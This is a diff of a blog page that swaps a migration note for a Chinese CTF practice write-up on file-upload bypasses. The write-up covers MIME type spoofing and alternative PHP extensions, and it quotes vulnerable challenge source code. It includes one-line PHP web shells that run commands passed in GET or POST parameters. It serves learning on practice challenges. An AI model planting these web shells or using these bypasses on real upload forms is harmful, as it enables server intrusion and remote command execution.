@@ -9,7 +9,7 @@
     <meta http-equiv="Cache-Control" content="no-siteapp">
     <title>
         
-            博客迁移记录
+            Web练习集合-持续更新
         
     </title>
     <link rel="shortcut icon" href="#"/>
@@ -37,21 +37,21 @@
     <div class="vertical">
         <div class="inner">
             
-                <h1 class="header-subtitle">博客迁移记录</h1>
+                <h1 class="header-subtitle">Web练习集合-持续更新</h1>
                 <div class="header-subinfo">
                     <p class="article-info-text">
                         <span>
-                            <i class="iconfont icon-time"></i> 发表时间：2024-03-10
+                            <i class="iconfont icon-time"></i> 发表时间：2024-06-04
                         </span>
                         
                             
-                                <span id="/2024/03/10/博客迁移记录/" class="leancloud_visitors" data-flag-title="博客迁移记录">
+                                <span id="/2024/06/04/Web练习集合-持续更新/" class="leancloud_visitors" data-flag-title="Web练习集合-持续更新">
                                     <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
                                 </span>
                             
                             
                                 <span>
-                                    <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2024/03/10/博客迁移记录/"></span>
+                                    <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2024/06/04/Web练习集合-持续更新/"></span>
                                 </span>
                               
                         
@@ -70,33 +70,65 @@
         <div id="article">
             <div class="toc"></div>
             <div class="article-body">
-                <h3 id="恢复"><a class="markdownIt-Anchor" href="#恢复"></a> 恢复</h3>
-<p>没有恢复以前的博客，但是有数据库存档，以后有时间恢复一下</p>
-<h3 id="追加"><a class="markdownIt-Anchor" href="#追加"></a> 追加</h3>
-<p>把之前写的<code>快速数论变换FNTT学习笔记</code>加上了，以后主要更新方向应该就是密码学方向</p>
-<h3 id="主题"><a class="markdownIt-Anchor" href="#主题"></a> 主题</h3>
-<p>用的主题是<code>LIveForCod</code>，真的很好看，但是好多配置不太会调，&quot;赞赏&quot;标签我想删掉也不知道在哪删，留言板还有好多之前的留言，也不知道怎么删，总之先暂时搁置吧，应该没多少人看((，多发点文章再说</p>
-<h3 id="待处理问题"><a class="markdownIt-Anchor" href="#待处理问题"></a> 待处理问题</h3>
-<ul>
-<li>
-<p>[x] 域名绑定</p>
-</li>
-<li>
-<p>[x] 渲染latex公式</p>
-</li>
-<li>
-<p>[ ] 丰富背景图</p>
-</li>
-<li>
-<p>[ ] 删除友链、赞赏等页面</p>
-</li>
-<li>
-<p>[ ] 迁移先前的博客文章</p>
-</li>
-<li>
-<p>[ ] 清空留言板</p>
-</li>
-</ul>
+                <h2 id="前记"><a class="markdownIt-Anchor" href="#前记"></a> 前记</h2>
+<p>前两天参加线下的CISCN，我一个Crypto手打线下Web（?），不过感觉倒还可以，于是在学Crypto同时再学一点Web*<s>（其实还想学点Reverse）</s>*，以一个Web萌新的角度做一点点题目。</p>
+<h2 id="文件上传"><a class="markdownIt-Anchor" href="#文件上传"></a> 文件上传</h2>
+<p>前置知识</p>
+<h3 id="mime绕过"><a class="markdownIt-Anchor" href="#mime绕过"></a> MIME绕过</h3>
+<p>MIME(multipurpose Internet mail extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p>
+<p>例如，某题目中上传一文件时，抓包如下</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node4.anna.nssctf.cn:28173</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>616</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://node4.anna.nssctf.cn:28173</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryYpI8YiROjYoMmOuo</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://node4.anna.nssctf.cn:28173/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=ja2335dc9se5fi68b7joni1vk1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryYpI8YiROjYoMmOuo</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;uploaded&quot;; filename=&quot;1.jpg&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/jpeg</span></span><br><span class="line"><span class="language-pgsql">这里有一些二进制数据</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryYpI8YiROjYoMmOuo</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">GoGoGo!</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryYpI8YiROjYoMmOuo--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure>
+<p>注意观察</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryYpI8YiROjYoMmOuo</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;1.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">这里有一些二进制数据</span><br></pre></td></tr></table></figure>
+<p><code>Content-Type: image/jpeg</code>就是可以修改用来绕过MIME的</p>
+<p>例如当提交php文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundarysrvJ3LkrXAVFQvi9</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php echo &quot;Hello world!&quot;; ?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里<code>Content-Type</code>的值变成了<code>application/octet-stream</code>，改成<code>image/jpeg</code>即可实现一次简单的MIME绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundarysrvJ3LkrXAVFQvi9</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php echo &quot;Hello world!&quot;; ?&gt;</span><br></pre></td></tr></table></figure>
+<p>php文件可以正常上传</p>
+<h4 id="例swpuctf-2021-新生赛easyupload10"><a class="markdownIt-Anchor" href="#例swpuctf-2021-新生赛easyupload10"></a> 例：<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/388">[SWPUCTF 2021 新生赛]easyupload1.0</a></h4>
+<p>上传图片，上传成功</p>
+<p>上传敏感文件，上传失败</p>
+<p>上传敏感文件，抓包改MIME标识<code>Content-Type: application/octet-stream</code>为<code>Content-Type: image/jpeg</code>，上传成功</p>
+<p>猜测服务端应当是只是过滤了<code>Content-Type</code></p>
+<p>上传一句话图片马获取环境变量<code>&lt;?php system('php -i'); ?&gt;</code></p>
+<p>得到flag</p>
+<p>但是flag不一定都是在环境变量里，还是拿到实际权限更实在</p>
+<p>如果上传的php为<code>&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;</code></p>
+<p>那我们可以在URL中访问<code>http://node4.anna.nssctf.cn:28073/upload/1.php?cmd=php%20-i</code>，使用GET方法传入参数指令</p>
+<p>当然也可以上传php：<code>&lt;?php system($_POST[&quot;cmd&quot;]); ?&gt;</code></p>
+<p>然后在浏览器的HackBar写指令<code>cmd=php -i</code>后execute</p>
+<p>附，<code>upload.php</code>中实现文件上传的实际代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$target_path</span>  = <span class="string">&quot;./upload&quot;</span>;</span><br><span class="line">    <span class="variable">$t_path</span> = <span class="variable">$target_path</span> . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = <span class="title function_ invoke__">substr</span>(<span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$uploaded_name</span>,<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">2048</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;文件太大了0.0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (((<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot; &quot;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/gif&quot;</span>)|| (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/png&quot;</span>)) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploaded_tmp</span>);</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$uploaded_tmp</span>, <span class="variable">$t_path</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$t_path&#125;</span> succesfully uploaded!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;想啥呢！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="特殊后缀绕过"><a class="markdownIt-Anchor" href="#特殊后缀绕过"></a> 特殊后缀绕过</h3>
+<p><code>.php</code>被ban了，没关系，可以试试<code>.pHp</code>、<code>.phtml</code>等等</p>
+<table>
+<thead>
+<tr>
+<th>语言</th>
+<th>可解析后缀</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ASP/ASPX</td>
+<td>asp，aspx，asa，ascx，ashx，asmx，cer，cdx</td>
+</tr>
+<tr>
+<td>PHP</td>
+<td>php，php5，php4，php3，phtml，pht</td>
+</tr>
+<tr>
+<td>JSP</td>
+<td>jsp，jspx，jspa，jsw，jsv，jspf，jtml</td>
+</tr>
+</tbody>
+</table>
+<h4 id="例swpuctf-2021-新生赛easyupload20"><a class="markdownIt-Anchor" href="#例swpuctf-2021-新生赛easyupload20"></a> 例：<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/423">[SWPUCTF 2021 新生赛]easyupload2.0</a></h4>
+<p>相比于<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/388">[SWPUCTF 2021 新生赛]easyupload1.0</a>，这次格外过滤了文件后缀名，如果后缀只要是<code>.php</code>就不可以正常保存，尝试改后缀为<code>.php4</code>，<code>.pHp</code>等，最终成功绕过的后缀为<code>.phtml</code>。</p>
+<p><strong>源码分析</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">time</span>() . (<span class="keyword">string</span>)<span class="title function_ invoke__">rand</span>(<span class="number">100</span>, <span class="number">1000</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>])) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$target_path</span>  =  <span class="string">&quot;./upload&quot;</span>;</span><br><span class="line">    <span class="variable">$t_path</span> = <span class="variable">$target_path</span> . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = <span class="title function_ invoke__">substr</span>(<span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$uploaded_name</span>,<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|hta|ini/i&quot;</span>, <span class="variable">$uploaded_ext</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;php是不行滴&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploaded_tmp</span>);</span><br><span class="line">		<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$uploaded_tmp</span>, <span class="variable">$t_path</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$t_path&#125;</span> succesfully uploaded!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;不传🐎还想要f1ag?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>注意<code>Line18</code>的正则匹配，绕过的目标就是它</p>
 
                 
                 <p class="end">__END__</p>
@@ -109,7 +141,7 @@
     <div class="suffix-box-right">
         <span class="suffix-box-title">文章作者：</span>MetaMiku
         <br>
-        <span class="suffix-box-title">文章出处：</span><a href="/2024/03/10/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E8%AE%B0%E5%BD%95/" target="_blank">博客迁移记录</a>
+        <span class="suffix-box-title">文章出处：</span><a href="/2024/06/04/Web%E7%BB%83%E4%B9%A0%E9%9B%86%E5%90%88-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/" target="_blank">Web练习集合-持续更新</a>
         <br>
         <span class="suffix-box-title">作者签名：</span>铁血的热血的冷血的.
         <br>
@@ -124,9 +156,8 @@
                 
                 <div class="article-prev-next">
                     
-                        <a href="/2024/03/10/%E5%BF%AB%E9%80%9F%E6%95%B0%E8%AE%BA%E5%8F%98%E6%8D%A2FNTT%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="prev-prefix">« </a> 上一篇：    <a href="/2024/03/10/%E5%BF%AB%E9%80%9F%E6%95%B0%E8%AE%BA%E5%8F%98%E6%8D%A2FNTT%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="发布于 2024-03-10 01:41">快速数论变换FNTT学习笔记</a>
-                        <br>
                     
+                        <a href="/2024/05/05/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0%E9%97%AE%E9%A2%98-DLP-Discrete-Log-Problem-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/" class="next-prefix">» </a> 下一篇：    <a href="/2024/05/05/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0%E9%97%AE%E9%A2%98-DLP-Discrete-Log-Problem-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/" title="发布于 2024-05-05 08:59">离散对数问题(DLP,Discrete Log Problem)持续更新</a>
                     
                 </div>
             </div>
